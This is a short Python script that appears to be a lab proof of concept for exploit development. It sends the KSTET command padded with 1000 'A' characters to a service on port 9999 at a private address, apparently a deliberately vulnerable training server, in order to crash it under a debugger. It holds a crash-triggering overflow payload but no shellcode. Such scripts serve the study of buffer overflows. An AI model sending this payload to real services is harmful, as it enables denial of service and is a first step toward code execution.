#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM, timeout, error

rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

payload = "KSTET /.:/"
payload += "A"*1000

if __name__ == '__main__':
    print('[*] connecting to remote host')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect(target)
        print('[*] receiving the welcome message')
        welcome = s.recv(1024)
        print('[*] received the following message:\n\t{msg}'.format(msg=welcome))
        s.send(payload)
        print('[*] B00M! ph33r')
    except timeout:
        print('[!] Timed out waiting for the server. Is it paused in the debugger?')
    except error:
        print('[!] A socket error occurred. Is the server running')
